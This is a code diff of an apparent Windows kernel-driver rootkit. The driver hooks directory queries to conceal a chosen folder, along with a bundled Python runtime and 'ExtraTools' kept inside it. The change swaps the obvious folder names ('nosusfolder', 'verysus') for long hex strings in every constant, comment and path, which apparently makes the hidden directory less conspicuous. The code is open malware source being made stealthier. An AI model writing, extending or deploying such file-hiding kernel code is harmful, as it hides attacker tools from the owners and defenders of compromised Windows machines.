@@ -3,8 +3,8 @@
 #include <wdm.h>
 
 
-const char* RootDirectory = "nosusfolder";
-const WCHAR* WideRootDirectory = L"nosusfolder";
+const char* RootDirectory = "9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097";
+const WCHAR* WideRootDirectory = L"9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097";
 
 
 // Definitions of functions/types:
@@ -223,7 +223,7 @@ void SearchForInitialEvilDir(PUNICODE_STRING Name, BOOL* IsRoot, BOOL* IsSame, D
 
     if (Checks >= 1) {
         if ((strlen(RootDirectory) + 1) * (sizeof(WCHAR) / sizeof(char)) <= Name->Length) {
-            *IsRoot = FALSE;  // Only other case in which changed should be made, to hide nosusfolder in SystemRoot
+            *IsRoot = FALSE;  // Only other case in which changed should be made, to hide 9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097 in SystemRoot
             for (DirIndex = 0; DirIndex < strlen(RootDirectory) && *IsSame; DirIndex++) {
                 if (RootDirectory[DirIndex] != Name->Buffer[DirIndex + 1]) {
                     *IsSame = FALSE;
@@ -231,7 +231,7 @@ void SearchForInitialEvilDir(PUNICODE_STRING Name, BOOL* IsRoot, BOOL* IsSame, D
             }
             if (*IsSame) {
                 if (!(Name->Buffer[DirIndex + 1] == L'\0' || Name->Buffer[DirIndex + 1] == L'\\')) {
-                    *IsSame = FALSE;  // Make sure that directories like nosusfolder1 wont get labeled as evil
+                    *IsSame = FALSE;  // Make sure that directories like 9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d70971 wont get labeled as evil
                 }
             }
         }
@@ -239,7 +239,7 @@ void SearchForInitialEvilDir(PUNICODE_STRING Name, BOOL* IsRoot, BOOL* IsSame, D
             *IsSame = FALSE;
             if (Checks >= 2) {
                 if (!((Name->Length == sizeof(WCHAR) && Name->Buffer[0] == L'\\') || (Name->Length == sizeof(WCHAR) * 2 && Name->Buffer[0] == L'\\' && Name->Buffer[1] == L'\0'))) {
-                    *IsRoot = FALSE;  // Only other case in which changed should be made, to hide nosusfolder in SystemRoot
+                    *IsRoot = FALSE;  // Only other case in which changed should be made, to hide 9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097 in SystemRoot
                 }
             }
         }
@@ -318,7 +318,7 @@ BOOL IsToHideRequest(PUNICODE_STRING RequestedDir, PUNICODE_STRING CurrentFile) 
                 if (IsSame) {
                     if (RequestedDir->Buffer[DirIndex] == L'\0' || RequestedDir->Buffer[DirIndex] == L'\\') {
                         DbgPrintEx(0, 0, "KMDFdriver Hooking - File/folder to hide starts/is equal to RequestedDir (FullPath %wZ, RequestedDir %wZ)\n",
-                            &CurrentHidden, RequestedDir);  // Make sure that directories like nosusfolder1 wont get labeled as evil
+                            &CurrentHidden, RequestedDir);  // Make sure that directories like 9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d70971 wont get labeled as evil
                         return TRUE;  // Comparison got to the end of RequestDir - until the end, it was equal
                     }
                 }
@@ -347,8 +347,8 @@ NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInform
     PFILE_FULL_DIR_INFORMATION PreviousFull = { 0 };
     PFILE_FULL_DIR_INFORMATION CurrFull = { 0 };
     PVOID PreviousCurrent = NULL;  // Used to verify if while should end
-    const WCHAR* PythonPath = L"\\nosusfolder\\verysus\\MinPython";
-    const WCHAR* UtilitiesPath = L"\\nosusfolder\\verysus\\ExtraTools";
+    const WCHAR* PythonPath = L"\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\MinPython";
+    const WCHAR* UtilitiesPath = L"\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\ExtraTools";
 
 
     // Check if query includes python/extra tool files that should not be blocked:
